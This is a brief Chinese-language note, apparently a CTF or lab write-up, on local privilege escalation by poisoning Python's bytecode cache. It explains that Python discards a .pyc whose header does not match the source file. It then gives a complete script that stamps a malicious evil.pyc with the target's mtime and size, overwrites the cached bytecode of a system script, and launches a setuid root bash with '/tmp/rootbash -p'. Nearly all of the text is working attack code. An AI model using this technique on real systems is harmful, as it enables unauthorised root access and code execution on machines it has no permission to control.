能发现pycache是777，但是修改了又会被改回去

查了一下发现是python会对比缓存文件的头部，如果对不上，就会不使用缓存，而使用源文件重新编译缓存

“通过 `struct.pack` 按照小端序（Little-endian）写回了你的**恶意字节码**头部。”

```bash
cat > /tmp/patch_pyc.py <<'PY'
import os
import struct

target_py = "/usr/local/lib/python_scripts/system_utils.py"
in_pyc    = "/tmp/evil.pyc"
out_pyc   = "/usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc"

# 获取元数据
st = os.stat(target_py)
mtime = int(st.st_mtime)
size  = st.st_size

# 读取恶意数据
with open(in_pyc, "rb") as f:
    data = bytearray(f.read())

# 修正头部 (Offset 8-11: mtime, 12-15: size)
data[8:12]  = struct.pack("<I", mtime)
data[12:16] = struct.pack("<I", size)

try:
    if os.path.exists(out_pyc):
        os.remove(out_pyc)
        print(f"[*] Removed existing {out_pyc}")
    
    with open(out_pyc, "wb") as f:
        f.write(data)
    print(f"[+] Success! Wrote patched pyc to {out_pyc}")
except Exception as e:
    print(f"[-] Failed: {e}")
PY

python3 /tmp/patch_pyc.py

/tmp/rootbash -p
```
